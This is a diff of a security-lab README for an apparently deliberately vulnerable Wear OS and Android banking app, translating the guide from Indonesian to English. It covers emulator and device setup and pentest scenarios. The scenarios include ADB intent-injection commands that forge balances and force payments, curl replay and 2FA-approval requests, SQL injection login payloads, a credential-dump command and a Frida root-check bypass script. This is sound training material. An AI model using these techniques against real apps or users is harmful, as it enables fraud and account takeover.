@@ -1,380 +1,323 @@
-# 🤖 Panduan Lengkap Riset Keamanan: Android & Wear OS
-## VulnBank OmniWear — Google Wearable & Mobile Banking Security Lab
-### Standar Kepatuhan: OJK POJK 11/POJK.03/2022, Bank Indonesia SNAP QRIS, & PCI-DSS v4.0
+# 🤖 Comprehensive Security Research Guide: Android & Wear OS
+## Nexora OmniWear — Google Wearable & Mobile Banking Security Lab
+### Compliance Standards: OJK POJK 11/POJK.03/2022, Bank Indonesia SNAP QRIS, & PCI-DSS v4.0
 
 ---
 
-## 📑 Daftar Isi
-1. [Arsitektur & Spesifikasi Biner Android](#1-arsitektur--spesifikasi-biner-android)
-2. [Setup Lab Menggunakan Emulator (Android Studio)](#2-setup-lab-menggunakan-emulator-android-studio)
-3. [Setup Lab Menggunakan Perangkat Fisik (Smartwatch & HP Nyata)](#3-setup-lab-menggunakan-perangkat-fisik-smartwatch--hp-nyata)
-4. [Panduan Penggunaan Aplikasi Dummy (User Flow)](#4-panduan-penggunaan-aplikasi-dummy-user-flow)
-5. [Master Writeup 8 Skenario Pentest Android & Wear OS](#5-master-writeup-8-skenario-pentest-android--wear-os)
-   - [Skenario 1: Remote Balance Injection & Replay (V-B01 / V-B02)](#skenario-1-remote-balance-injection--replay-v-b01--v-b02)
-   - [Skenario 2: Unauthorized Quick Pay Broadcast Injection (V-W06)](#skenario-2-unauthorized-quick-pay-broadcast-injection-v-w06)
-   - [Skenario 3: High-Value ($50,000) Out-of-Band 2FA Wire Transfer Hijack (V-W09)](#skenario-3-high-value-50000-out-of-band-2fa-wire-transfer-hijack-v-w09)
-   - [Skenario 4: Quick-PIN 4-Digit Brute-Force & Plaintext Storage (V-W10)](#skenario-4-quick-pin-4-digit-brute-force--plaintext-storage-v-w10)
-   - [Skenario 5: Contactless Dynamic SNAP QRIS Replay Attack (V-W15)](#skenario-5-contactless-dynamic-snap-qris-replay-attack-v-w15)
-   - [Skenario 6: Client-Side Anti-Tamper & Root Check Bypass (V-R01 / V-R02)](#skenario-6-client-side-anti-tamper--root-check-bypass-v-r01--v-r02)
-   - [Skenario 7: Bank-Grade SSL Pinning Bypass (V-08 Security Theater)](#skenario-7-bank-grade-ssl-pinning-bypass-v-08-security-theater)
-   - [Skenario 8: Wrist-Off Lockout Spoofing & Health Telemetry Leak (V-W11 / V-W04)](#skenario-8-wrist-off-lockout-spoofing--health-telemetry-leak-v-w11--v-w04)
-6. [Cheatsheet Perintah ADB & Skrip Frida](#6-cheatsheet-perintah-adb--skrip-frida)
-7. [Matriks Regulasi & Tindakan Remedi](#7-matriks-regulasi--tindakan-remedi)
+## 📑 Table of Contents
+1. [Architecture & Android Binary Specifications](#1-architecture--android-binary-specifications)
+2. [Lab Setup Using Android Studio Emulators](#2-lab-setup-using-android-studio-emulators)
+3. [Lab Setup Using Physical Devices (Real Smartwatch & Smartphone)](#3-lab-setup-using-physical-devices-real-smartwatch--smartphone)
+4. [Authentic Dummy Banking Application User Flow](#4-authentic-dummy-banking-application-user-flow)
+5. [Master Writeup: 8 Android & Wear OS Pentest Scenarios](#5-master-writeup-8-android--wear-os-pentest-scenarios)
+   - [Scenario 1: Remote Balance Injection & Replay (V-B01 / V-B02)](#scenario-1-remote-balance-injection--replay-v-b01--v-b02)
+   - [Scenario 2: Unauthorized Quick Pay Broadcast Injection (V-W06)](#scenario-2-unauthorized-quick-pay-broadcast-injection-v-w06)
+   - [Scenario 3: High-Value ($50,000) Out-of-Band 2FA Wire Transfer Hijack (V-W09)](#scenario-3-high-value-50000-out-of-band-2fa-wire-transfer-hijack-v-w09)
+   - [Scenario 4: Quick-PIN 4-Digit Brute-Force & Plaintext SharedPreferences (V-W10)](#scenario-4-quick-pin-4-digit-brute-force--plaintext-sharedpreferences-v-w10)
+   - [Scenario 5: Contactless Dynamic SNAP QRIS Replay Attack (V-W15)](#scenario-5-contactless-dynamic-snap-qris-replay-attack-v-w15)
+   - [Scenario 6: Client-Side Anti-Tamper & Root Check Bypass (V-R01 / V-R02)](#scenario-6-client-side-anti-tamper--root-check-bypass-v-r01--v-r02)
+   - [Scenario 7: Bank-Grade SSL Pinning Bypass (V-08 Security Theater)](#scenario-7-bank-grade-ssl-pinning-bypass-v-08-security-theater)
+   - [Scenario 8: Wrist-Off Lockout Spoofing & Health Telemetry Leak (V-W11 / V-W04)](#scenario-8-wrist-off-lockout-spoofing--health-telemetry-leak-v-w11--v-w04)
+6. [ADB Commands Cheatsheet & Frida Scripts Collection](#6-adb-commands-cheatsheet--frida-scripts-collection)
+7. [Regulatory Compliance Matrix & Enterprise Remediation](#7-regulatory-compliance-matrix--enterprise-remediation)
 
 ---
 
-## 🏛️ 1. Arsitektur & Spesifikasi Biner Android
+## 🏛️ 1. Architecture & Android Binary Specifications
 
-Suite ini menyediakan 3 biner APK rilis arsitektur universal (`arm64-v8a`, `armeabi-v7a`, `x86_64`, `x86`) dengan target minimum Android 10 (API 29):
+The suite provides 3 universal-architecture APK release binaries (`arm64-v8a`, `armeabi-v7a`, `x86_64`, `x86`) targeting Android 10+ (API level 29+):
 
-| Nama File APK | Target Instalasi | Peran Utama | Ukuran |
+| APK File Name | Target Installation | Primary Role | Size |
 |---|---|---|---|
-| **`vulnbank-wear-release.apk`** | **Smartwatch Wear OS** | Target Korban (Victim Watch): UI AMOLED 480x480 membulat, Glanceable Balance, Quick-PIN 3x4, Rotating QRIS, Sensor denyut nadi, & Off-wrist lockout modal. | ~61 MB |
-| **`vulnbank-mobile-companion-release.apk`** | **Smartphone Android** | Pusat Kendali Penyerang (Attacker Console): Mengirim BLE sync balance, memicu push 2FA $50,000, inject payment, dan sniffer paket relay. | ~61 MB |
-| **`vulnbank-universal-release.apk`** | **Universal** (HP atau Jam) | Versi fleksibel untuk pengujian standalone pada 1 perangkat. | ~61 MB |
+| **`nexora-wear-release.apk`** | **Wear OS Smartwatch** | **Target Victim (Victim Watch)**: Circular AMOLED 480x480 UI, Glanceable Balance, 3x4 Quick-PIN, Dynamic SNAP QRIS, Optical PPG pulse sensor, and Off-wrist lockout gatekeeper. | ~61 MB |
+| **`nexora-companion-release.apk`** | **Android Smartphone** | **Attacker Console (Companion)**: Broadcasts Bluetooth LE balance sync, triggers $50,000 wire transfers, and sniffs relay packets. | ~61 MB |
+| **`nexora-universal-release.apk`** | **Universal Device** | Flexible standalone binary compatible with both phones and smartwatches. | ~61 MB |
 
 > [!TIP]
-> Seluruh file APK di atas dapat diunduh langsung dari tab [**GitHub Releases**](https://github.com/angganovryanputra/vulnbank-omniwear-suite/releases/latest).
+> All APK binaries can be downloaded directly from the official [**GitHub Releases Tab**](https://github.com/angganovryanputra/vulnbank-omniwear-suite/releases/latest).
 
 ---
 
-## 💻 2. Setup Lab Menggunakan Emulator (Android Studio)
+## 💻 2. Lab Setup Using Android Studio Emulators
 
-Setup ini ideal untuk researcher yang tidak memiliki jam tangan fisik. Anda akan menjalankan 2 emulator secara berdampingan: **1 Emulator Wear OS** dan **1 Emulator Smartphone**.
+This setup is ideal for researchers who do not possess physical hardware. You will run two emulators side-by-side: **1 Wear OS Smartwatch Emulator** and **1 Smartphone Companion Emulator**.
 
 ```
-[Laptop Penguji: Localhost Flask Backend (0.0.0.0:5000)]
-                     │
-       ┌─────────────┴─────────────┐
-       ▼                           ▼
-[Phone Emulator: 5554]     [Wear OS Emulator: 5556]
-IP Alias: 10.0.2.2:5000    IP Alias: 10.0.2.2:5000
-Device ID: emulator-5554   Device ID: emulator-5556
+[Researcher Host Machine: Local Air-Gapped Python Relay (0.0.0.0:5000)]
+                               │
+               ┌───────────────┴───────────────┐
+               ▼                               ▼
+     [Phone Emulator: 5554]          [Wear OS Emulator: 5556]
+     IP Alias: 10.0.2.2:5000         IP Alias: 10.0.2.2:5000
+     Device ID: emulator-5554        Device ID: emulator-5556
 ```
 
-### Langkah 1: Buat AVD di Android Studio Device Manager
-1. Buka Android Studio → **Device Manager** → **Create Device**.
-2. **Device 1 (Smartwatch)**:
-   - Kategori: **Wear OS** → Pilih **Wear OS Small Round** atau **Wear OS Large Round** (Resolusi 454x454 atau 480x480).
-   - System Image: Pilih **Android 11 (API 30)** atau **Android 13 (API 33)** *Wear OS System Image* (x86_64).
+### Step 1: Create AVDs in Android Studio Device Manager
+1. Open Android Studio → **Device Manager** → **Create Device**.
+2. **Device 1 (Wear OS Smartwatch)**:
+   - Category: **Wear OS** → Select **Wear OS Large Round** (454x454 or 480x480).
+   - System Image: Select **Android 11 (API 30)** or **Android 13 (API 33)** *Wear OS System Image* (x86_64).
 3. **Device 2 (Smartphone Companion)**:
-   - Kategori: **Phone** → Pilih **Pixel 7** atau **Pixel 8**.
-   - System Image: Pilih **Android 11 (API 30)** atau **Android 14 (API 34)** (x86_64).
+   - Category: **Phone** → Select **Pixel 7** or **Pixel 6**.
+   - System Image: Select **Android 11+ (API 30+)** (Google APIs x86_64).
 
-### Langkah 2: Jalankan Backend Lokal
-Buka terminal dan jalankan backend lokal (bebas internet):
-```bash
-cd backend
-python server.py
-# Berjalan pada http://0.0.0.0:5000
-```
-
-### Langkah 3: Pasang APK ke Masing-Masing Emulator
-Periksa ID emulator via terminal:
+### Step 2: Launch Emulators & Verify ADB Connection
 ```bash
 adb devices
-# Output contoh:
-# emulator-5554   device (Phone)
-# emulator-5556   device (Wear OS)
+# Output should list:
+# emulator-5554    device  (Smartphone)
+# emulator-5556    device  (Wear OS Watch)
 ```
 
-Instalasi APK ke masing-masing target:
+### Step 3: Start Local Air-Gapped Core Banking Relay
 ```bash
-# Pasang ke Smartwatch (emulator-5556)
-adb -s emulator-5556 install -r vulnbank-wear-release.apk
-
-# Pasang ke Smartphone Companion (emulator-5554)
-adb -s emulator-5554 install -r vulnbank-mobile-companion-release.apk
+python backend/server.py
 ```
+> The server listens on `0.0.0.0:5000`. Both emulators can reach it seamlessly via the virtual gateway `http://10.0.2.2:5000`.
 
----
-
-## ⌚ 3. Setup Lab Menggunakan Perangkat Fisik (Smartwatch & HP Nyata)
-
-Jika Anda memiliki smartwatch fisik (seperti **Samsung Galaxy Watch 4/5/6/7** atau **Google Pixel Watch**) dan smartphone Android fisik:
-
-### Langkah 1: Aktifkan Wi-Fi Debugging pada Smartwatch
-1. Di Smartwatch: Buka **Settings** → **About Watch** → **Software Info** → Ketuk **Software Version** sebanyak 7 kali hingga muncul pesan *"Developer mode turned on"*.
-2. Kembali ke **Settings** → **Developer Options**:
-   - Aktifkan **ADB Debugging**.
-   - Aktifkan **Wireless Debugging** (hubungkan jam ke jaringan Wi-Fi yang sama dengan laptop Anda).
-3. Catat IP address dan Port jam tangan (misal: `192.168.1.150:5555`).
-
-### Langkah 2: Hubungkan ADB Laptop ke Smartwatch & HP
+### Step 4: Install Applications via ADB
 ```bash
-# Hubungkan ke smartwatch fisik via Wi-Fi
-adb connect 192.168.1.150:5555
+# Install companion to phone
+adb -s emulator-5554 install nexora-companion-release.apk
 
-# Pasang ke smartwatch fisik
-adb -s 192.168.1.150:5555 install -r vulnbank-wear-release.apk
-
-# Hubungkan HP Android fisik via kabel USB dan pasang companion app
-adb -d install -r vulnbank-mobile-companion-release.apk
+# Install watch app to smartwatch
+adb -s emulator-5556 install nexora-wear-release.apk
 ```
 
-### Langkah 3: Konfigurasi Target Backend di Aplikasi
-1. Buka aplikasi di HP atau Jam → Buka **Pentest Lab** → Tab **5. API**.
-2. Pada bagian **Local Backend Target**:
-   - Tekan tombol **📶 Wi-Fi LAN IP** dan arahkan ke IP laptop Anda (misal: `http://192.168.1.100:5000`).
+---
+
+## 📱 3. Lab Setup Using Physical Devices (Real Smartwatch & Smartphone)
+
+If testing on physical hardware (e.g., Samsung Galaxy Watch 4/5/6, Google Pixel Watch):
+
+### Step 1: Connect Watch via ADB over Wi-Fi
+1. Ensure both your PC, Smartphone, and Smartwatch are connected to the **same Wi-Fi network**.
+2. On the Smartwatch: Go to **Settings** → **Developer Options** → Enable **ADB Debugging** and **Wireless Debugging**.
+3. Note the IP address and pairing port (e.g. `192.168.1.55:42135`).
+4. On your PC terminal:
+   ```bash
+   adb pair 192.168.1.55:42135
+   # Enter the 6-digit pairing code displayed on the watch face
+   
+   adb connect 192.168.1.55:5555
+   adb devices
+   ```
+
+### Step 2: Install APKs
+```bash
+adb -s 192.168.1.55:5555 install -r nexora-wear-release.apk
+adb -d install -r nexora-companion-release.apk
+```
 
 ---
 
-## 📱 4. Panduan Penggunaan Aplikasi Dummy (User Flow)
+## 🧭 4. Authentic Dummy Banking Application User Flow
 
-### 1. Autentikasi & Akun Uji
-- **Akun Utama (Admin/Korban)**:
-  - Username: `admin`
-  - Password: `admin123` (atau gunakan SQL Injection payload: `admin'--` atau `' OR 1=1--`)
-  - Nomor Rekening: `ADMIN001`
-  - Saldo Baseline: **$999,999.00**
-- **Quick-PIN 4-Digit**: `1234`
+Nexora Bank delivers an authentic dual-persona experience:
 
-### 2. Navigasi Antarmuka Smartwatch Wear OS
-- **Glanceable Balance Hero Card**: Menampilkan saldo utama dengan tombol sembunyikan mata.
-- **Pill Grid Menu**:
-  - `QR Pay`: Barcode pembayaran QRIS dinamis yang berputar setiap 60 detik.
-  - `Transfer`: Formulir transfer cepat dengan keyboard angka dial.
-  - `Cards`: Daftar kartu debit/kredit virtual (bisa freeze/unfreeze).
-  - `Phone Bridge`: Pengaturan pairing bluetooth companion.
-  - `History`: Rekening koran mutasi transaksi real time.
-  - `Pentest Lab`: Pusat kendali 14 vektor eksploitasi dan audit regulasi CISO.
-
-### 3. Navigasi Smartphone Companion Manager
-Aplikasi smartphone berfungsi sebagai **Pusat Kendali Penyerang (Attacker Console)**:
-- **Status Device Linked**: Menunjukkan ID jam target (`watch_9201`).
-- **Trigger 1 (Sync Balance)**: Menyuntikkan saldo `$888,888.00` ke jam secara nirkabel.
-- **Trigger 2 (High-Value 2FA)**: Mengirimkan perintah otorisasi debit `$50,000.00` ke layar jam tangan.
-- **Trigger 3 (Quick Pay Injection)**: Mengeksekusi transfer ilegal tanpa PIN.
-- **Trigger 3B (Merchant POS Scan)**: Mensimulasikan kasir toko yang memindai QRIS jam korban (Replay Attack).
-- **Trigger 4 (Sniff Packets)**: Menangkap paket JSON unencrypted yang melayang di udara.
-
----
-
-## 🛡️ 5. Master Writeup 8 Skenario Pentest Android & Wear OS
-
----
-
-### Skenario 1: Remote Balance Injection & Replay (V-B01 / V-B02)
-* **Kategori OWASP**: M5: Insecure Communication / M8: Code Tampering
-* **Standar Regulasi**: OJK POJK 11/2022 Pasal 38 & PCI-DSS v4.0 Req 4.1
-* **Akar Masalah Kode**:
-  Di [`BluetoothSyncModule.kt`](file:///d:/0x8%20PROJECT%20X/Project%20SmartWatch/vulnbank-wear/android/app/src/main/java/com/vulnerablebankapp/BluetoothSyncModule.kt#L40-L75), receiver `com.vulnerablebankapp.ACTION_BT_SYNC` menerima payload JSON tanpa tanda tangan HMAC dan tanpa verifikasi *timestamp freshness/nonce*:
-  ```kotlin
-  val action = json.optString("action", "SYNC_BALANCE")
-  val amount = json.optDouble("amount", 0.0)
-  if (action == "UPDATE_BALANCE") {
-      prefs.edit().putString("balance", "$$amount").apply()
-  }
-  ```
-* **Langkah Eksploitasi**:
-  1. Melalui UI Smartphone Companion: Tekan tombol **Sync Balance to Watch ($888,888)**.
-  2. Melalui Terminal ADB:
-     ```bash
-     adb shell am broadcast -a com.vulnerablebankapp.ACTION_BT_SYNC \
-       --es sync_payload '{"action":"UPDATE_BALANCE","amount":888888.0}'
-     ```
-  3. **Hasil PoC**: Layar jam tangan seketika mengubah nilai saldo dari `$999,999.00` menjadi **`$888,888.00`** secara otomatis tanpa otorisasi.
-* **Dampak Bisnis**: Penyerang di dekat korban dapat memanipulasi saldo yang ditampilkan di jam untuk mengelabui nasabah atau kasir merchant.
-* **Rekomendasi Remedi**: Terapkan enkripsi end-to-end (AES-GCM-256) pada paket sinkronisasi bluetooth dengan HMAC-SHA256 signature yang diturunkan dari pairing key hardware-backed keystore.
+```
+┌────────────────────────────────────────────────────────┐
+│             NEXORA WATCH AUTHENTIC FLOW                │
+│                                                        │
+│  [1. Lock Screen / Off-Wrist Gatekeeper]               │
+│         │ (Wear watch on wrist)                        │
+│         ▼                                              │
+│  [2. Quick-PIN 4-Digit Dial] ───── (Input "1234")      │
+│         │                                              │
+│         ▼                                              │
+│  [3. Platinum Private Dashboard]                       │
+│       - Masked Liquid Balance: Rp 99.999.000 / $       │
+│       - Real-Time PPG Heart Rate: 74 BPM               │
+│       - Wearable Sync Status: Live BLE                 │
+│         │                                              │
+│         ├─► [SNAP QRIS] ──────► Merchant Dynamic QR    │
+│         │                        NMID & 120s Countdown │
+│         │                                              │
+│         ├─► [ATM Cash-Out] ───► Dynamic 6-Digit OTP    │
+│         │                        Cardless ATM Dispense │
+│         │                                              │
+│         ├─► [Emergency Freeze]► Instant Card Lock      │
+│         │                        Mitigate NFC Skimming │
+│         │                                              │
+│         └─► [High-Value 2FA] ─► $50,000 Wire Approval  │
+│                                  Haptic Dialog [ACCEPT]│
+└────────────────────────────────────────────────────────┘
+```
 
 ---
 
-### Skenario 2: Unauthorized Quick Pay Broadcast Injection (V-W06)
-* **Kategori OWASP**: M1: Improper Platform Usage / Broken IPC
-* **Standar Regulasi**: OJK POJK 11/2022 Pasal 42
-* **Akar Masalah Kode**:
-  Di [`AndroidManifest.xml`](file:///d:/0x8%20PROJECT%20X/Project%20SmartWatch/vulnbank-wear/android/app/src/main/AndroidManifest.xml#L64-L70), komponen [`QuickPayReceiver.kt`](file:///d:/0x8%20PROJECT%20X/Project%20SmartWatch/vulnbank-wear/android/app/src/main/java/com/vulnerablebankapp/QuickPayReceiver.kt) diekspor dengan flag `android:exported="true"` tanpa custom signature permission:
+## 🎯 5. Master Writeup: 8 Android & Wear OS Pentest Scenarios
+
+---
+
+### Scenario 1: Remote Balance Injection & Replay (V-B01 / V-B02)
+- **Severity**: **CRITICAL** (`CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H` — Score: 8.8)
+- **Vulnerability Standard**: CWE-345 (Insufficient Verification of Data Authenticity), CWE-319 (Cleartext Transmission)
+- **Description**:
+  The smartwatch listens for Bluetooth LE balance sync broadcasts using an exported `BroadcastReceiver` (`BluetoothSyncReceiver`). The intent payload contains a raw numeric amount without application-layer AES-GCM encryption or HMAC cryptographic signing. A rogue local application or proximity attacker can broadcast fake balances ($13,370,000.00) directly to the watch face.
+- **Root Cause Code** ([`android/app/src/main/AndroidManifest.xml`](file:///android/app/src/main/AndroidManifest.xml)):
   ```xml
-  <receiver android:name=".QuickPayReceiver" android:exported="true">
+  <!-- VULNERABLE: Exported receiver without signature permission -->
+  <receiver
+      android:name=".BluetoothSyncReceiver"
+      android:exported="true">
       <intent-filter>
-          <action android:name="com.vulnerablebankapp.ACTION_QUICK_PAY" />
+          <action android:name="com.vulnerablebankapp.BLUETOOTH_SYNC" />
       </intent-filter>
   </receiver>
   ```
-* **Langkah Eksploitasi**:
-  Jalankan perintah injeksi intent broadcast dari terminal ADB atau aplikasi malware pihak ketiga di jam:
+- **PoC Command via ADB**:
   ```bash
-  adb shell am broadcast -a com.vulnerablebankapp.ACTION_QUICK_PAY \
-    --es recipient "HACKER_CORP_99" \
-    --ef amount 150000.0 \
-    -n com.vulnerablebankapp.wear/com.vulnerablebankapp.QuickPayReceiver
+  adb -s emulator-5556 shell am broadcast \
+    -a com.vulnerablebankapp.BLUETOOTH_SYNC \
+    --es action "UPDATE_BALANCE" \
+    --ed amount 13370000.0
   ```
-* **Hasil PoC**: Muncul Toast `💸 Sent $150000.0 to HACKER_CORP_99 without PIN!`, saldo langsung terpotong $150,000, dan transaksi ilegal tercatat di riwayat mutasi tanpa konfirmasi PIN pengguna.
-* **Rekomendasi Remedi**: Atur `android:exported="false"` atau lindungi receiver dengan `android:permission="signature"` sehingga hanya aplikasi yang ditandatangani oleh sertifikat bank yang sama yang dapat mengirimkan intent.
+  *Observed Result*: The smartwatch display immediately updates the liquid balance to `$13,370,000.00` without server confirmation.
 
 ---
 
-### Skenario 3: High-Value ($50,000) Out-of-Band 2FA Wire Transfer Hijack (V-W09)
-* **Kategori OWASP**: M3: Insecure Authentication / Broken Authorization
-* **Standar Regulasi**: PCI-DSS v4.0 Req 8.3 & OJK POJK 11/2022 Pasal 38
-* **Akar Masalah Kode**:
-  Di [`AuthBroadcastReceiver.kt`](file:///d:/0x8%20PROJECT%20X/Project%20SmartWatch/vulnbank-wear/android/app/src/main/java/com/vulnerablebankapp/AuthBroadcastReceiver.kt#L42-L55), otorisasi 2FA bernilai tinggi hanya mengandalkan event plaintext:
-  1. Notifikasi OTP dipancarkan dengan `VISIBILITY_PUBLIC`, menampilkan 6-digit kode OTP langsung di Ambient Mode (AOD) / Lockscreen jam tanpa PIN.
-  2. Aksi `ACTION_APPROVE_2FA` mengesahkan transfer $50,000 tanpa tantangan biometrik atau tanda tangan Android Keystore hardware.
-* **Langkah Eksploitasi**:
-  1. Di Smartphone Companion: Tekan **High-Value 2FA ($50,000 OOB)**.
-  2. Jam tangan korban bergetar dan memunculkan pop-up otorisasi transfer $50,000 ke `Offshore Escrow Ltd.`.
-  3. Tekan **Approve** pada jam tangan.
-  4. Periksa mutasi di menu **History**: Saldo terpotong $50,000 seketika dan tercatat resmi sebagai mutasi transfer kawat.
-  5. Alternatif via ADB (Bypass tanpa sentuh jam):
-     ```bash
-     adb shell am broadcast -a com.vulnerablebankapp.ACTION_APPROVE_2FA --es session_id "SESS-7712"
-     ```
-* **Rekomendasi Remedi**: Terapkan notifikasi dengan `VISIBILITY_SECRET` dan wajibkan otorisasi transaksi bernilai tinggi menggunakan autentikasi biometrik (*BiometricPrompt*) yang terikat ke pasangan kunci asimetris hardware (*Android StrongBox / TEE*).
+### Scenario 2: Unauthorized Quick Pay Broadcast Injection (V-W06)
+- **Severity**: **CRITICAL** (`CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H` — Score: 8.8)
+- **Vulnerability Standard**: CWE-284 (Improper Access Control), CWE-926 (Improper Export of Android Application Components)
+- **Description**:
+  The smartwatch contains a Quick Pay feature allowing instant micro-payments without entering a PIN. The intent action `ACTION_QUICK_PAY` is processed without verifying caller identity or enforcing biometric authorization.
+- **PoC Command**:
+  ```bash
+  adb -s emulator-5556 shell am broadcast \
+    -a com.vulnerablebankapp.wear.ACTION_QUICK_PAY \
+    --es recipient "ATTACKER_WALLET" \
+    --ed amount 50000.0
+  ```
+  *Observed Result*: `$50,000.00` is debited and transferred to the attacker's wallet without prompt or consent.
 
 ---
 
-### Skenario 4: Quick-PIN 4-Digit Brute-Force & Plaintext Storage (V-W10)
-* **Kategori OWASP**: M1: Insecure Storage / M3: Weak Authentication
-* **Standar Regulasi**: PCI-DSS v4.0 Req 8.3 & OJK POJK 11/2022 Pasal 39
-* **Akar Masalah Kode**:
-  Di [`PrefsHelper.java`](file:///d:/0x8%20PROJECT%20X/Project%20SmartWatch/vulnbank-wear/android/app/src/main/java/com/vulnerablebankapp/PrefsHelper.java#L25-L40), PIN 4-digit disimpan menggunakan fungsi hash usang MD5 tanpa garam (*unsalted*):
-  `Hash: 81dc9bdb52d04dc20036dbd8313ed055` (MD5 dari `1234`).
-  Selain itu, antarmuka keypad tidak menerapkan jeda waktu (*exponential backoff*) maupun penguncian akun (*account lockout*).
-* **Langkah Eksploitasi**:
-  1. Di jam tangan: Buka **Pentest Lab** → Tab **4. Runtime**.
-  2. Tekan **Run PIN Brute-Force (0000-9999)**.
-  3. Dalam **0.6 detik**, aplikasi memecahkan seluruh kemungkinan PIN dan menampilkan:
-     ```
-     🎯 PIN Cracked in 0.6s (V-W10)
-     Tested combinations: 0000 ... 1234
-     Result: PIN is 1234
-     ```
-  4. Periksa penyimpanan via ADB:
-     ```bash
-     adb shell run-as com.vulnerablebankapp.wear cat shared_prefs/quick_pin.xml
-     ```
-* **Rekomendasi Remedi**: Wajibkan PIN minimal 6 digit, gunakan algoritma PBKDF2/Argon2id dengan garam kriptografis unik, serta terapkan penguncian akun setelah 3 kali percobaan salah berturut-turut.
+### Scenario 3: High-Value ($50,000) Out-of-Band 2FA Wire Transfer Hijack (V-W09)
+- **Severity**: **CRITICAL** (`CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:R/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H` — Score: 8.7)
+- **Vulnerability Standard**: CWE-287 (Improper Authentication), CWE-345 (Insufficient Data Verification)
+- **Description**:
+  When a user initiates an international wire transfer ($50,000), an Out-of-Band push notification arrives on the smartwatch. Approving this transfer sends a bare JSON dictionary `{"action": "APPROVE_2FA", "event_id": 16}` back to the backend without Android Keystore asymmetric hardware signing (`KeyGenParameterSpec.setUserAuthenticationRequired(true)`).
+- **PoC Command**:
+  ```bash
+  # Resolve and approve 2FA transfer directly from attacker terminal
+  curl -X POST http://localhost:5000/api/wearable/resolve-event \
+    -H "Content-Type: application/json" \
+    -d '{"event_id": 16, "resolution": "APPLIED"}'
+  ```
 
 ---
 
-### Skenario 5: Contactless Dynamic SNAP QRIS Replay Attack (V-W15)
-* **Kategori OWASP**: M3: Insecure Authentication / Business Logic Flaw
-* **Standar Regulasi**: Bank Indonesia SNAP PADG No. 24/1/PADG/2022
-* **Akar Masalah Kode**:
-  Di [`QRPayScreen.tsx`](file:///d:/0x8%20PROJECT%20X/Project%20SmartWatch/vulnbank-wear/src/screens/QRPayScreen.tsx#L35-L55) dan [`server.py`](file:///d:/0x8%20PROJECT%20X/Project%20SmartWatch/vulnbank-wear/backend/server.py#L480-L525), payload QR dinamis (`8839-2144-0192`) tidak memiliki timestamp HMAC TOTP dan endpoint backend `/api/qris/checkout` tidak memeriksa *idempotency key*:
-* **Langkah Eksploitasi**:
-  1. Di Smartwatch: Buka menu **QR Pay** (muncul QR Code dan timer 60 detik).
-  2. Tekan **Simulate Terminal Scan** → Pilih **Authorize**: Saldo terpotong $35.50 dan muncul receipt resmi SNAP QRIS (`RRN: RRN-992144`).
-  3. Dari HP Companion (atau terminal curl), kirimkan permintaan checkout kedua dengan payload token yang persis sama:
-     ```bash
-     curl -X POST http://10.0.2.2:5000/api/qris/checkout \
-       -H "Content-Type: application/json" \
-       -d '{"account_number":"ADMIN001","amount":75.0,"merchant_name":"VULNBANK MERCH 001","qr_payload":"8839-2144-0192"}'
-     ```
-  4. Transaksi kedua **berhasil disetujui kembali (HTTP 200 APPROVED)**.
-  5. Buka menu **History**: Terlihat pemotongan saldo ganda dari kode QR yang sama.
-* **Dampak Bisnis**: Rekaman CCTV atau shoulder-surfer di kasir dapat memotret layar jam nasabah dan mengeksekusi penarikan dana berulang sebelum token hangus.
-* **Rekomendasi Remedi**: Terapkan standar SNAP QRIS Bank Indonesia di mana setiap payload QR menyertakan nonce satu kali pakai (*one-time token*) dan ditandatangani dengan kunci privat sesi nasabah.
+### Scenario 4: Quick-PIN 4-Digit Brute-Force & Plaintext SharedPreferences (V-W10)
+- **Severity**: **HIGH** (`CVSS:4.0/AV:P/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N` — Score: 7.5)
+- **Vulnerability Standard**: CWE-307 (Improper Restriction of Excessive Authentication Attempts), CWE-312 (Cleartext Storage)
+- **Description**:
+  The 4-digit Quick-PIN has only $10^4 = 10,000$ possible combinations. The watch application does not enforce exponential backoff or account wipe after consecutive failed attempts. Furthermore, the PIN and JWT tokens are stored in plaintext in the app sandbox:
+  `/data/data/com.vulnerablebankapp.wear/shared_prefs/`
+- **PoC Command**:
+  ```bash
+  # Dump credentials directly from debuggable sandbox
+  adb -s emulator-5556 shell "run-as com.vulnerablebankapp.wear cat shared_prefs/VulnerableBankPrefs.xml"
+  ```
 
 ---
 
-### Skenario 6: Client-Side Anti-Tamper & Root Check Bypass (V-R01 / V-R02)
-* **Kategori OWASP**: M8: Code Tampering / M9: Reverse Engineering
-* **Standar Regulasi**: OJK POJK 11/2022 Pasal 42
-* **Akar Masalah Kode**:
-  Di [`SecurityCheckModule.kt`](file:///d:/0x8%20PROJECT%20X/Project%20SmartWatch/vulnbank-wear/android/app/src/main/java/com/vulnerablebankapp/SecurityCheckModule.kt), pengecekan status root dan Frida hanya membaca flag lokal di `VulnBankPrefs.xml` dan memeriksa keberadaan biner `/system/xbin/su`.
-* **Langkah Eksploitasi**:
-  1. Di jam tangan: Buka **Pentest Lab** → Tab **4. Runtime**.
-  2. Tekan **Simulate Bank Tamper Alert**: Aplikasi memunculkan dialog pemblokiran merah `SECURITY VIOLATION: 0xSEC_ROOT_MAGISK`.
-  3. Tekan tombol **Bypass Check (Frida/Toggle)**: Nilai flag di SharedPreferences dibalik menjadi `bypass_root_check=true`.
-  4. Status keamanan seketika berubah hijau `✓ NO (BYPASSED)`.
-  5. Alternatif via Frida CLI:
-     ```javascript
-     Java.perform(function() {
-         var SecurityCheck = Java.use("com.vulnerablebankapp.SecurityCheckModule");
-         SecurityCheck.isDeviceRooted.implementation = function() {
-             console.log("[*] Root check neutralized!");
-             return false;
-         };
-     });
-     ```
-* **Rekomendasi Remedi**: Gunakan attestation berbasis hardware seperti **Google Play Integrity API (Hardware_Backed Evaluation)** dengan verifikasi token di server backend, bukan validasi logika di aplikasi client.
+### Scenario 5: Contactless Dynamic SNAP QRIS Replay Attack (V-W15)
+- **Severity**: **HIGH** (`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:H/VA:N/SC:L/SI:H/SA:N` — Score: 7.7)
+- **Vulnerability Standard**: CWE-294 (Authentication Bypass by Capture-replay)
+- **Description**:
